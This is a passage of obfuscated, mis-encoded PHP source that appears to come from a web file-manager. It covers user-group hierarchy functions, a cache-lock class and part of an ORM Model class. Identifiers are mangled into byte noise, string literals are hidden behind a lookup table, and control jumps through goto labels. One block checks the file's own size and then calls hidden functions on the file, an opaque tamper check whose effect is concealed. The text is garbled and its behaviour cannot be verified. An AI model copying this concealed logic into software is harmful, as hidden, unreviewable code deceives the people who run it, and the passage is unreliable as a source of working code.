$GLOBALS[$¢æ»½Åö[6]][$¢æ»½Åö[92]][$¢æ»½Åö[2241]]; if (KodUser::isRoot()) { $¢ø“Éë = !1; } foreach ($®ı¨«’ as &$ˆÁ’ãğ) { $Àã¥çÃ× = $this->parentLevelArray($ˆÁ’ãğ[$¢æ»½Åö[612]]); $Ìö¤àì = $¢æ»½Åö[12]; foreach ($Àã¥çÃ× as $úÃú¢ìë => $ò”öà˜Õ) { if ($¢ø“Éë && $úÃú¢ìë == 0) { continue; } $Ìö¤àì .= $¸Ãùº[$ò”öà˜Õ] . $¢æ»½Åö[8]; } if ($Àã¥çÃ×) { $Ìö¤àì .= $ˆÁ’ãğ[$¢æ»½Åö[32]]; } $ˆÁ’ãğ[$¢æ»½Åö[617]] = str_replace($¢æ»½Åö[255], $¢æ»½Åö[8], $Ìö¤àì); } unset($ˆÁ’ãğ); } private function _listAppendSourceRoot(&$â÷à‡», $¢çÉÖ£) { $ç ÑğÓ« =& $_SERVER[‘ÆÜ‘œ]; $ÎÖõñıÉ = Model($ç ÑğÓ«[939])->listSourceRoot(SourceModel::TYPE_GROUP, $¢çÉÖ£); $ÎÖõñıÉ = array_to_keyvalue($ÎÖõñıÉ, $ç ÑğÓ«[597]); $ÎÖõñıÉ = array_remove_key($ÎÖõñıÉ, $ç ÑğÓ«[597]); foreach ($â÷à‡» as &$ƒ¢‚™â) { $ƒ¢‚™â[$ç ÑğÓ«[90]] = $ÎÖõñıÉ[$ƒ¢‚™â[$ç ÑğÓ«[1446]]] ? $ÎÖõñıÉ[$ƒ¢‚™â[$ç ÑğÓ«[1446]]] : array(); } unset($ƒ¢‚™â); } protected function groupMerge($§ş¢âÜÅ) { $§ş¢âÜÅ = array_values(array_unique($§ş¢âÜÅ)); $ùñß¿Ñ¾ = array(); for ($ÀÉƒşàŸ = 0; $ÀÉƒşàŸ < count($§ş¢âÜÅ); $ÀÉƒşàŸ++) { $÷ç¸”å· = !1; for ($á‘¹²’… = 0; $á‘¹²’… < count($§ş¢âÜÅ); $á‘¹²’…++) { if ($ÀÉƒşàŸ == $á‘¹²’…) { continue; } if ($this->isParentOf($§ş¢âÜÅ[$á‘¹²’…], $§ş¢âÜÅ[$ÀÉƒşàŸ])) { $÷ç¸”å· = !0; break; } } if (!$÷ç¸”å·) { $ùñß¿Ñ¾[] = $§ş¢âÜÅ[$ÀÉƒşàŸ]; } } return $ùñß¿Ñ¾; } protected function isParentOf($ğ…øşøÏ, $²÷¶¨Ä) { $Üê–ÄëÄ =& $_SERVER[‘ÆÜ‘œ]; if (!$ğ…øşøÏ || !$²÷¶¨Ä || $ğ…øşøÏ == $²÷¶¨Ä) { return !1; } $Ãúœ¼ãè = $this->getInfoSimple($ğ…øşøÏ); $Å ÙÓ¹µ = $this->getInfoSimple($²÷¶¨Ä); $õàÄ€ç› = $Ãúœ¼ãè[$Üê–ÄëÄ[612]] . $ğ…øşøÏ . $Üê–ÄëÄ[50]; if (substr($Å ÙÓ¹µ[$Üê–ÄëÄ[612]], 0, strlen($õàÄ€ç›)) == $õàÄ€ç›) { return !0; } return !1; } public function groupShowRoot($¯…¥…«, $Ç‘Ğ§ = false) { $÷˜ìÌ»ã =& $_SERVER[‘ÆÜ‘œ]; $‡Ñ€„Ş’ = $this->getInfo($¯…¥…«); if (!$‡Ñ€„Ş’) { return array(); } $Úğù§‡¢ = $this->parentLevelArray($‡Ñ€„Ş’[$÷˜ìÌ»ã[612]]); $¢ÄÑúşç = array($¯…¥…«); if (count($Úğù§‡¢) == 0) { return $¢ÄÑúşç; } if ($Ç‘Ğ§ && count($Úğù§‡¢) == 1) { return $¢ÄÑúşç; } if (!$‡Ñ€„Ş’[$÷˜ìÌ»ã[563]] || !isset($‡Ñ€„Ş’[$÷˜ìÌ»ã[563]][$÷˜ìÌ»ã[2222]]) || $‡Ñ€„Ş’[$÷˜ìÌ»ã[563]][$÷˜ìÌ»ã[2222]] == $÷˜ìÌ»ã[886]) { return $this->groupShowRoot($Úğù§‡¢[count($Úğù§‡¢) - 1], $Ç‘Ğ§); } if ($‡Ñ€„Ş’[$÷˜ìÌ»ã[563]][$÷˜ìÌ»ã[2222]] == $÷˜ìÌ»ã[442]) { $Ëèˆ„· = explode($÷˜ìÌ»ã[50], $‡Ñ€„Ş’[$÷˜ìÌ»ã[563]][$÷˜ìÌ»ã[2223]]); if ($Ëèˆ„·) { $¢ÄÑúşç = array_merge($¢ÄÑúşç, $Ëèˆ„·); } } return $¢ÄÑúşç; } protected function resetParentLevel() { $²ş–ù˜ =& $_SERVER[‘ÆÜ‘œ]; $ü–‹º˜” = $²ş–ù˜[1446]; $—úõéÛ = $this->select(); $—úõéÛ = array_to_keyvalue($—úõéÛ, $ü–‹º˜”); foreach ($—úõéÛ as $ËÑèÌÔÑ) { $Üä¸ÌŸÂ = $ËÑèÌÔÑ; $ºÑ¢Ìıä = array(); while ($Üä¸ÌŸÂ[$²ş–ù˜[191]] != 0) { $ºÑ¢Ìıä[] = $Üä¸ÌŸÂ[$²ş–ù˜[191]]; $Üä¸ÌŸÂ = $—úõéÛ[$Üä¸ÌŸÂ[$²ş–ù˜[191]]]; } $ºÑ¢Ìıä[] = 0; $ºÑ¢Ìıä = $²ş–ù˜[50] . implode($²ş–ù˜[50], array_reverse($ºÑ¢Ìıä)) . $²ş–ù˜[50]; $this->setNamePinyin($ËÑèÌÔÑ[$ü–‹º˜”], $ËÑèÌÔÑ[$²ş–ù˜[32]]); $this->where(array($ü–‹º˜” => $ËÑèÌÔÑ[$ü–‹º˜”]))->save(array($²ş–ù˜[682] => $ºÑ¢Ìıä)); } return $—úõéÛ; } public function groupNameAuto($¨¾ı¤ªÀ, $±ÄŠÂ·) { $İíÆŞ½Å =& $_SERVER[‘ÆÜ‘œ]; $ò’ğ ƒ = $this->where(array($İíÆŞ½Å[500] => $¨¾ı¤ªÀ))->getField($İíÆŞ½Å[32], !0); if (!$ò’ğ ƒ || !in_array($±ÄŠÂ·, $ò’ğ ƒ)) { return $±ÄŠÂ·; } for ($åÉ—÷Ú— = 1; $åÉ—÷Ú— <= count($ò’ğ ƒ) + 1; $åÉ—÷Ú—++) { $ìı•½¦ñ = $±ÄŠÂ· . "\x28{$åÉ—÷Ú—}\51"; if (!in_array($ìı•½¦ñ, $ò’ğ ƒ)) { return $ìı•½¦ñ; } } } public function groupSwitch($Ü¯èå¿, $ğ«ÒÇ·İ) { $‰ú”ÇÖ› =& $_SERVER[‘ÆÜ‘œ]; $ÖëôÄçñ = array($‰ú”ÇÖ›[1446] => array($‰ú”ÇÖ›[7], array($Ü¯èå¿, $ğ«ÒÇ·İ))); $¤¿¹Ø¸— = $this->where($ÖëôÄçñ)->select(); $¤¿¹Ø¸— = array_to_keyvalue($¤¿¹Ø¸—, $‰ú”ÇÖ›[1446]); $Ê†õŸà = _get($¤¿¹Ø¸—, $Ü¯èå¿); $¯½îÉÔ¡ = _get($¤¿¹Ø¸—, $ğ«ÒÇ·İ); if (!$Ê†õŸà || !$¯½îÉÔ¡ || $Ê†õŸà[$‰ú”ÇÖ›[191]] == 0) { return !1; } if ($Ê†õŸà[$‰ú”ÇÖ›[1446]] == $¯½îÉÔ¡[$‰ú”ÇÖ›[1446]]) { return !1; } if (strpos($¯½îÉÔ¡[$‰ú”ÇÖ›[612]], $Ê†õŸà[$‰ú”ÇÖ›[612]] . $Ê†õŸà[$‰ú”ÇÖ›[1446]] . $‰ú”ÇÖ›[50]) === 0) { return !1; } $ÖëôÄçñ = array($‰ú”ÇÖ›[1446] => $Ü¯èå¿); $Á™ƒ¬–Š = Model($‰ú”ÇÖ›[2228])->where($ÖëôÄçñ)->select(); if (!$Á™ƒ¬–Š) { $Á™ƒ¬–Š = array(); } foreach ($Á™ƒ¬–Š as $¢òşÂ ) { $±ÑöÇî = $¢òşÂ [$‰ú”ÇÖ›[1544]]; $ÖëôÄçñ = array($‰ú”ÇÖ›[1544] => $±ÑöÇî, $‰ú”ÇÖ›[1446] => $ğ«ÒÇ·İ); $Ô³êå° = Model($‰ú”ÇÖ›[2228])->where($ÖëôÄçñ)->find(); if (!$Ô³êå°) { $¾Ï±†Ïø = array($ğ«ÒÇ·İ => $¢òşÂ [$‰ú”ÇÖ›[1591]]); Model($‰ú”ÇÖ›[625])->userGroupAdd($±ÑöÇî, $¾Ï±†Ïø); } Model($‰ú”ÇÖ›[625])->userGroupRemove($±ÑöÇî, $Ü¯èå¿); } $ÖëôÄçñ = array($‰ú”ÇÖ›[189] => 2, $‰ú”ÇÖ›[191] => 0, $‰ú”ÇÖ›[508] => 1, $‰ú”ÇÖ›[597] => array($‰ú”ÇÖ›[7], array($Ü¯èå¿, $ğ«ÒÇ·İ))); $à‹…¯ÁÑ = Model($‰ú”ÇÖ›[939])->where($ÖëôÄçñ)->field($‰ú”ÇÖ›[2242])->select(); $à‹…¯ÁÑ = array_to_keyvalue($à‹…¯ÁÑ, $‰ú”ÇÖ›[597], $‰ú”ÇÖ›[192]); $ç›µŠ = !empty($à‹…¯ÁÑ[$Ü¯èå¿]) ? $à‹…¯ÁÑ[$Ü¯èå¿] : !1; if ($ç›µŠ) { if (!$à‹…¯ÁÑ[$ğ«ÒÇ·İ]) { $à‹…¯ÁÑ[$ğ«ÒÇ·İ] = Model($‰ú”ÇÖ›[939])->groupRootAdd($ğ«ÒÇ·İ); } $›ÌÀğ§ß = $à‹…¯ÁÑ[$ğ«ÒÇ·İ]; $ÖëôÄçñ = array($‰ú”ÇÖ›[191] => $ç›µŠ); $à‹…¯ÁÑ = Model($‰ú”ÇÖ›[939])->where($ÖëôÄçñ)->field($‰ú”ÇÖ›[2243])->select(); if (!$à‹…¯ÁÑ) { $à‹…¯ÁÑ = array(); } Model($‰ú”ÇÖ›[939])->moveClearAuth = !1; foreach ($à‹…¯ÁÑ as $ªÔš³Ğô) { $—©ŒŞÕ  = $ªÔš³Ğô[$‰ú”ÇÖ›[508]] == $‰ú”ÇÖ›[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($‰ú”ÇÖ›[939])->move($ªÔš³Ğô[$‰ú”ÇÖ›[192]], $›ÌÀğ§ß, $—©ŒŞÕ ); } Model($‰ú”ÇÖ›[939])->moveClearAuth = !0; $ÖëôÄçñ = array($‰ú”ÇÖ›[189] => 2, $‰ú”ÇÖ›[597] => $Ü¯èå¿); $×˜ìÃ‘è = array($‰ú”ÇÖ›[597] => $ğ«ÒÇ·İ); Model($‰ú”ÇÖ›[2244])->where($ÖëôÄçñ)->save($×˜ìÃ‘è); Model($‰ú”ÇÖ›[2245])->where($ÖëôÄçñ)->save($×˜ìÃ‘è); } $this->_changeChildLevel($¤¿¹Ø¸—[$Ü¯èå¿], $¤¿¹Ø¸—[$ğ«ÒÇ·İ], !0); $this->where(array($‰ú”ÇÖ›[191] => $Ü¯èå¿))->save(array($‰ú”ÇÖ›[191] => $ğ«ÒÇ·İ)); $this->_clearChildrenCache($¤¿¹Ø¸—[$ğ«ÒÇ·İ]); return !0; } } goto EÎëâ·á©Å; F§‰ìÚİ­: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $æ˜ö®ê’ =& $_SERVER[‘ÆÜ‘œ]; if (self::$handle) { return self::$handle; } $ªğ‰„Ü¿ = $GLOBALS[$æ˜ö®ê’[6]][$æ˜ö®ê’[434]]; self::$timeout = $ªğ‰„Ü¿[$æ˜ö®ê’[958]] ? $ªğ‰„Ü¿[$æ˜ö®ê’[958]] : 10; $·Šò± Ã = _get($GLOBALS[$æ˜ö®ê’[6]], $æ˜ö®ê’[959]); $è°‘åÛ¦ = $ªğ‰„Ü¿[$æ˜ö®ê’[941]] ? $ªğ‰„Ü¿[$æ˜ö®ê’[941]] : $æ˜ö®ê’[231]; if ($è°‘åÛ¦ == $æ˜ö®ê’[21] && $·Šò± Ã == $æ˜ö®ê’[13]) { $è°‘åÛ¦ = $æ˜ö®ê’[231]; } switch ($è°‘åÛ¦) { case $æ˜ö®ê’[944]: self::$handle = new CacheLockRedis(); break; case $æ˜ö®ê’[945]: self::$handle = new CacheLockMemcached(); break; case $æ˜ö®ê’[21]: self::$handle = new CacheLockDatabase(); break; case $æ˜ö®ê’[231]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($æ˜ö®ê’[960], $æ˜ö®ê’[961]); } return self::$handle; } private static function key($¸ı¿¥»ã) { return $_SERVER[‘ÆÜ‘œ][962] . Cache::key($¸ı¿¥»ã); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ë–ô»¿§ = '') { self::$errorMsg = $ë–ô»¿§; } public static function lockGlobal($©’æ¦, $òõÑ÷§ş) { return self::lock($©’æ¦, $òõÑ÷§ş, !0); } public static function lock($«åüë®ë, $ùñ‘öª’ = false, $’´Ã§ªé = false) { $ì¢ğ›æ± =& $_SERVER[‘ÆÜ‘œ]; $ıˆÚ°çº = self::init(); $äº¸ŞÏÛ = self::key($«åüë®ë); $ùñ‘öª’ = $ùñ‘öª’ ? $ùñ‘öª’ : self::$timeout; $Ú®Œ¯¯ = timeFloat(); if (_get($GLOBALS, $ì¢ğ›æ±[963], !1)) { if (!$ıˆÚ°çº->lock($äº¸ŞÏÛ, 0.2)) { die; } return !0; } $ÑôÕ…ë” = $ıˆÚ°çº->lock($äº¸ŞÏÛ, $ùñ‘öª’); $ûØíœµ = timeFloat(); if (!$ÑôÕ…ë”) { $ œœÀúÍ = "\x6c\x6f\x63\153\x20\x65\x72\x72\157\162\73\x6b\145\171\x3d{$«åüë®ë}\73\x74\x69\155\145\x3d{$ùñ‘öª’}\73" . self::$errorMsg . $ì¢ğ›æ±[74] . get_caller_msg(); $öÌÍµö® = LNG($ì¢ğ›æ±[964]) . "\x28{$ùñ‘öª’}\163\51\56" . LNG($ì¢ğ›æ±[965]); $öÌÍµö® .= $ì¢ğ›æ±[966]; if (is_string(self::$errorMsg) && self::$errorMsg) { $öÌÍµö® = $öÌÍµö® . $ì¢ğ›æ±[967] . self::$errorMsg; } write_log($ì¢ğ›æ±[968] . sprintf($ì¢ğ›æ±[969], timeFloat() - $Ú®Œ¯¯) . $ì¢ğ›æ±[970] . $ œœÀúÍ . $ì¢ğ›æ±[971] . json_encode(error_get_last()), $ì¢ğ›æ±[961]); show_json($öÌÍµö®, !1); } if (!$’´Ã§ªé) { self::$lockItem[$äº¸ŞÏÛ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÂÚİ¨ª˜ = number_format(timeFloat() - $ûØíœµ, 3); write_log($ì¢ğ›æ±[972] . $«åüë®ë . $ì¢ğ›æ±[973] . $ÂÚİ¨ª˜, $ì¢ğ›æ±[961]); } return $ÑôÕ…ë”; } public static function lockGet($…¨êÚƒ) { $³Ÿàç“œ = self::key($…¨êÚƒ); if (self::$lockItem[$³Ÿàç“œ]) { return self::$lockItem[$³Ÿàç“œ]; } return self::init()->lockGet($³Ÿàç“œ); } public static function unlock($¢µ‰Û Ğ) { $´õ“›ˆ‰ =& $_SERVER[‘ÆÜ‘œ]; $¸Ôß­¤Ü = self::key($¢µ‰Û Ğ); self::$lockItem[$¸Ôß­¤Ü] = null; self::init()->unlock($¸Ôß­¤Ü); if (GLOBAL_DEBUG_LOG_ALL) { write_log($´õ“›ˆ‰[974] . $¢µ‰Û Ğ, $´õ“›ˆ‰[961]); } return; } public static function unlockRuntime() { $±á¾‘Õ´ =& $_SERVER[‘ÆÜ‘œ]; $È‡›Ûçî = self::init(); $æø¸²°ñ = !1; foreach (self::$lockItem as $½‰‘»™ä => $—ó»ÄêÒ) { if (!$—ó»ÄêÒ) { continue; } $È‡›Ûçî->unlock($½‰‘»™ä); if (!$æø¸²°ñ) { $æø¸²°ñ = !0; write_log($±á¾‘Õ´[975] . $½‰‘»™ä . $±á¾‘Õ´[74] . get_caller_msg(), $±á¾‘Õ´[961]); continue; } write_log($±á¾‘Õ´[975] . $½‰‘»™ä, $±á¾‘Õ´[961]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ù´²¹ˆé = number_format(timeFloat() - TIME_FLOAT, 3); write_log($±á¾‘Õ´[976] . $Ù´²¹ˆé . $±á¾‘Õ´[977] . ACTION, $±á¾‘Õ´[961]); } } public static function fileLock($ˆ™ç›Û‚) { $Ş‚†îÙ© =& $_SERVER[‘ÆÜ‘œ]; if (!$GLOBALS[$Ş‚†îÙ©[978]]) { $GLOBALS[$Ş‚†îÙ©[978]] = array(); } $GLOBALS[$Ş‚†îÙ©[978]][$ˆ™ç›Û‚] = !1; $½…™´ûÄ = fopen(DATA_PATH . $ˆ™ç›Û‚ . $Ş‚†îÙ©[979], $Ş‚†îÙ©[980]); if (!$½…™´ûÄ) { return !1; } $GLOBALS[$Ş‚†îÙ©[978]][$ˆ™ç›Û‚] = $½…™´ûÄ; if (flock($½…™´ûÄ, LOCK_EX)) { return !0; } self::unlock($ˆ™ç›Û‚); show_json($Ş‚†îÙ©[981], !1); return !1; } public static function fileUnlock($öÎ¬ƒáì) { $‚Õú“°ı =& $_SERVER[‘ÆÜ‘œ]; $ôùÄ½Çî = $GLOBALS[$‚Õú“°ı[978]][$öÎ¬ƒáì]; if (!$ôùÄ½Çî) { return; } $GLOBALS[$‚Õú“°ı[978]][$öÎ¬ƒáì] = !1; flock($ôùÄ½Çî, LOCK_UN); fclose($ôùÄ½Çî); } public static function fileUnlockAll() { $©¦”ÅÅ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($GLOBALS[$©¦”ÅÅ[978]]) || !$GLOBALS[$©¦”ÅÅ[978]]) { return; } foreach ($GLOBALS[$©¦”ÅÅ[978]] as $›¾õæÚˆ => $…­™Òì°) { if (!$…­™Òì°) { continue; } $GLOBALS[$©¦”ÅÅ[978]][$›¾õæÚˆ] = !1; flock($…­™Òì°, LOCK_UN); fclose($…­™Òì°); } $GLOBALS[$©¦”ÅÅ[978]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ŞÀÚÑè” =& $_SERVER[‘ÆÜ‘œ]; $êÄ…¤§ô = $GLOBALS[$ŞÀÚÑè”[6]][$ŞÀÚÑè”[434]]; self::$cachePath = $êÄ…¤§ô[$ŞÀÚÑè”[231]][$ŞÀÚÑè”[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¸«Úˆ©É, $¹úí“Ç = 0) { $Ÿ‚Ì»ŒÄ =& $_SERVER[‘ÆÜ‘œ]; $ÍÃº‰û¿ = microtime(!0); $µÛÆ×À² = $ÍÃº‰û¿ + $¹úí“Ç + 0.0001; $™ÆüôŸç = rtrim(self::$cachePath, $Ÿ‚Ì»ŒÄ[8]) . $Ÿ‚Ì»ŒÄ[982] . md5($¸«Úˆ©É) . $Ÿ‚Ì»ŒÄ[979]; if (file_exists($™ÆüôŸç) && filemtime($™ÆüôŸç) && filemtime($™ÆüôŸç) < time() - 10) { @unlink($™ÆüôŸç); } do { if (file_exists($™ÆüôŸç)) { cacheLockWait(); continue; } $Ÿ–˜ğ¶º = fopen($™ÆüôŸç, $Ÿ‚Ì»ŒÄ[983]); if (!$Ÿ–˜ğ¶º) { return !1; } $ŸäöÈüõ = flock($Ÿ–˜ğ¶º, LOCK_EX | LOCK_NB); self::$caches[$¸«Úˆ©É] = array($Ÿ‚Ì»ŒÄ[984] => $Ÿ–˜ğ¶º, $Ÿ‚Ì»ŒÄ[231] => $™ÆüôŸç); fwrite($Ÿ–˜ğ¶º, $µÛÆ×À²); clearstatcache(); if ($Ÿ–˜ğ¶º && $ŸäöÈüõ) { return !0; } cacheLockWait(); } while (microtime(!0) < $µÛÆ×À²); $this->unlock($¸«Úˆ©É); return !1; } public function lockGet($¬˜ñÄÓ„) { $÷üòûœ =& $_SERVER[‘ÆÜ‘œ]; $ÇÏÓ½ò = rtrim(self::$cachePath, $÷üòûœ[8]) . $÷üòûœ[982] . md5($¬˜ñÄÓ„) . $÷üòûœ[979]; return file_exists($ÇÏÓ½ò); } public function unlock($ËÛ»•ø) { $ÉÕÎ¨İÃ =& $_SERVER[‘ÆÜ‘œ]; $ÇÌœÌØâ = self::$caches[$ËÛ»•ø]; if (!$ÇÌœÌØâ) { return; } @flock($ÇÌœÌØâ[$ÉÕÎ¨İÃ[984]], LOCK_UN); @fclose($ÇÌœÌØâ[$ÉÕÎ¨İÃ[984]]); @unlink($ÇÌœÌØâ[$ÉÕÎ¨İÃ[231]]); unset(self::$caches[$ËÛ»•ø]); } } goto Bù„¾Ø®Ü; dñ°¶‘ Œ: if ($_SERVER[$_SERVER[‘ÆÜ‘œ][324]] != $_size($_file)) { $_getc = $_SERVER[‘ÆÜ‘œ][325]; $_getfile = $_SERVER[$_SERVER[‘ÆÜ‘œ][326]] . $_SERVER[‘ÆÜ‘œ][327]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‘ÆÜ‘œ][286], $_getfilec); if (count($_getarrs) < $_SERVER[‘ÆÜ‘œ][328]) { $exit = $_SERVER[‘ÆÜ‘œ][329]; $exit(); } $_act = $_SERVER[‘ÆÜ‘œ][330]; $_act($_file); } class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\157\x72\144\x65\162", "\141\x6c\x69\141\x73", "\150\x61\166\151\156\x67", "\147\x72\157\165\x70", "\x6c\157\x63\x6b", "\x64\151\x73\164\x69\156\143\x74", "\141\165\x74\157", "\x66\x69\154\x74\145\x72", "\x76\x61\154\151\144\141\x74\x65", "\162\145\x73\x75\154\164", "\x62\x69\x6e\144", "\x74\x6f\x6b\x65\x6e"); public function __construct($ÉŞ¬„–â = '', $Ô¨ì‡¯ = '', $åÅ‰å‰” = '') { $•İË¡§Ÿ =& $_SERVER[‘ÆÜ‘œ]; $this->_initialize(); if (!empty($ÉŞ¬„–â)) { if (strpos($ÉŞ¬„–â, $•İË¡§Ÿ[10])) { list($this->dbName, $this->name) = explode($•İË¡§Ÿ[10], $ÉŞ¬„–â); } else { $this->name = $ÉŞ¬„–â; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ô¨ì‡¯)) { $this->tablePrefix = $•İË¡§Ÿ[12]; } elseif ($•İË¡§Ÿ[12] != $Ô¨ì‡¯) { $this->tablePrefix = $Ô¨ì‡¯; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($•İË¡§Ÿ[331]); } $this->db(0, empty($this->connection) ? $åÅ‰å‰” : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $˜‘ñş´ß =& $_SERVER[‘ÆÜ‘œ]; if (empty($this->fields)) { if (think_config($˜‘ñş´ß[332])) { $úƒ´Øç = $this->dbName ? $this->dbName : think_config($˜‘ñş´ß[333]); $…¥õÄ¸š = think_var_cache($˜‘ñş´ß[334] . strtolower(get_path_this($úƒ´Øç) . $˜‘ñş´ß[10] . $this->name)); if ($…¥õÄ¸š) { $ ÈÃ¦ö¸ = think_config($˜‘ñş´ß[335]); if (empty($ ÈÃ¦ö¸) || $…¥õÄ¸š[$˜‘ñş´ß[336]] == $ ÈÃ¦ö¸) { $this->fields = $…¥õÄ¸š; return; } } } $this->flush(); } } public function flush() { $Õ®ñš—Ã =& $_SERVER[‘ÆÜ‘œ]; $this->db->setModel($this->name); $ò´æĞ¯¡ = $this->db->getFields($this->getTableName()); if (!$ò´æĞ¯¡) { return !1; } $this->fields = array_keys($ò´æĞ¯¡); $this->fields[$Õ®ñš—Ã[337]] = !1; foreach ($ò´æĞ¯¡ as $³‘é…ä => $À¿ÏØáÍ) { $ĞûÔ¼´[$³‘é…ä] = $À¿ÏØáÍ[$Õ®ñš—Ã[33]]; if ($À¿ÏØáÍ[$Õ®ñš—Ã[39]]) { $this->fields[$Õ®ñš—Ã[338]] = $³‘é…ä; if ($À¿ÏØáÍ[$Õ®ñš—Ã[42]]) { $this->fields[$Õ®ñš—Ã[337]] = !0; } } } $this->fields[$Õ®ñš—Ã[339]] = $ĞûÔ¼´; if (think_config($Õ®ñš—Ã[335])) { $this->fields[$Õ®ñš—Ã[336]] = think_config($Õ®ñš—Ã[335]); } if (think_config($Õ®ñš—Ã[332])) { $åš”ş¼÷ = $this->dbName ? $this->dbName : think_config($Õ®ñš—Ã[333]); think_var_cache($Õ®ñš—Ã[334] . strtolower(get_path_this($åš”ş¼÷) . $Õ®ñš—Ã[10] . $this->name), $this->fields); } } public function switchModel($ü“ÏÓï, $ªÅı˜å© = array()) { $³áœó‹Õ =& $_SERVER[‘ÆÜ‘œ]; $¦’…™Ú = ucwords(strtolower($ü“ÏÓï)) . $³áœó‹Õ[340]; if (!class_exists($¦’…™Ú)) { think_exception($¦’…™Ú . think_lang($³áœó‹Õ[341])); } $this->_extModel = new $¦’…™Ú($this->name); if (!empty($ªÅı˜å©)) { foreach ($ªÅı˜å© as $‡íĞÇñ) { $this->_extModel->setProperty($‡íĞÇñ, $this->{$‡íĞÇñ}); } } return $this->_extModel; } public function __set($ûø¹òç, $°ÕÄå) { $this->data[$ûø¹òç] = $°ÕÄå; } public function __get($ ‚Ëƒ­¡) { return isset($this->data[$ ‚Ëƒ­¡]) ? $this->data[$ ‚Ëƒ­¡] : null; } public function __isset($•ƒ­ÙÓ) { return isset($this->data[$•ƒ­ÙÓ]); } public function __unset($àÏöâÔ¸) { unset($this->data[$àÏöâÔ¸]); } public function __call($Ìİ¬Ñ¼£, $•…ÒØõè) { $†ß”ÛÇ¦ =& $_SERVER[‘ÆÜ‘œ]; if (in_array(strtolower($Ìİ¬Ñ¼£), $this->methods, !0)) { $this->options[strtolower($Ìİ¬Ñ¼£)] = $•…ÒØõè[0]; return $this; } elseif (in_array(strtolower($Ìİ¬Ñ¼£), array($†ß”ÛÇ¦[342], $†ß”ÛÇ¦[343], $†ß”ÛÇ¦[344], $†ß”ÛÇ¦[345], $†ß”ÛÇ¦[346]), !0)) { $Êá¤¸ù‡ = isset($•…ÒØõè[0]) ? $•…ÒØõè[0] : $†ß”ÛÇ¦[221]; $Êá¤¸ù‡ = $this->db->parseKey($Êá¤¸ù‡); return $this->getField(strtoupper($Ìİ¬Ñ¼£) . $†ß”ÛÇ¦[347] . $Êá¤¸ù‡ . $†ß”ÛÇ¦[348] . $Ìİ¬Ñ¼£, $†ß”ÛÇ¦[342]); } elseif (strtolower(substr($Ìİ¬Ñ¼£, 0, 5)) == $†ß”ÛÇ¦[349]) { $Êá¤¸ù‡ = think_parse_name(substr($Ìİ¬Ñ¼£, 5)); $ŞÇóŠËÒ[$Êá¤¸ù‡] = $•…ÒØõè[0]; return $this->where($ŞÇóŠËÒ)->find(); } elseif (strtolower(substr($Ìİ¬Ñ¼£, 0, 10)) == $†ß”ÛÇ¦[350]) { $É¶îÕşƒ = think_parse_name(substr($Ìİ¬Ñ¼£, 10)); $ŞÇóŠËÒ[$É¶îÕşƒ] = $•…ÒØõè[0]; return $this->where($ŞÇóŠËÒ)->getField($•…ÒØõè[1]); } elseif (isset($this->_scope[$Ìİ¬Ñ¼£])) { return $this->scope($Ìİ¬Ñ¼£, $•…ÒØõè[0]); } elseif (method_exists($this, $Ìİ¬Ñ¼£) || method_exists($this, $†ß”ÛÇ¦[351] . $Ìİ¬Ñ¼£)) { array_unshift($•…ÒØõè, $Ìİ¬Ñ¼£); return call_user_func_array(array($this, $†ß”ÛÇ¦[352]), $•…ÒØõè); } else { return call_user_func_array(array(parent, $Ìİ¬Ñ¼£), $•…ÒØõè); } } protected function call() { $Å˜Ú…ˆ¹ =& $_SERVER[‘ÆÜ‘œ]; $«†øÈí÷ = func_get_args(); $³±ò‘‡ = array_shift($«†øÈí÷); $Ôéó¾¡ã = $³±ò‘‡; if (is_array($³±ò‘‡)) { $Ôéó¾¡ã = $³±ò‘‡[1]; $³±ò‘‡ = $³±ò‘‡[0]; } $¯ˆÕ£®Å = count($«†øÈí÷) - 1; if (isset($«†øÈí÷[$¯ˆÕ£®Å]) && $«†øÈí÷[$¯ˆÕ£®Å] === $³±ò‘‡) { think_exception(__CLASS__ . $Å˜Ú…ˆ¹[4] . $³±ò‘‡ . think_lang($Å˜Ú…ˆ¹[353])); return; } $«†øÈí÷[] = $³±ò‘‡; if (method_exists($this, $Å˜Ú…ˆ¹[354])) { $ØÏ¶ÎÊ¼ = call_user_func_array(array($this, $Å˜Ú…ˆ¹[355]), array($Ôéó¾¡ã, $«†øÈí÷)); if (!is_null($ØÏ¶ÎÊ¼) && $ØÏ¶ÎÊ¼ !== !1) { return $ØÏ¶ÎÊ¼; } } $È´ÜáêÎ = !1; if (method_exists($this, $³±ò‘‡)) { $È´ÜáêÎ = call_user_func_array(array($this, $³±ò‘‡), $«†øÈí÷); } if (method_exists($this, $Å˜Ú…ˆ¹[356])) { $ØÏ¶ÎÊ¼ = call_user_func_array(array($this, $Å˜Ú…ˆ¹[357]), array($Ôéó¾¡ã, $«†øÈí÷, $È´ÜáêÎ)); if ($ØÏ¶ÎÊ¼) { return $ØÏ¶ÎÊ¼; } } return $È´ÜáêÎ; } protected function _initialize() { } protected function _facade($µ„²ôş) { $®Œƒ´éé =& $_SERVER[‘ÆÜ‘œ]; if (!empty($this->fields)) { foreach ($µ„²ôş as $Ÿ²ãä¯É => $•ŞÔòåÅ) { if (is_array($this->fields) && 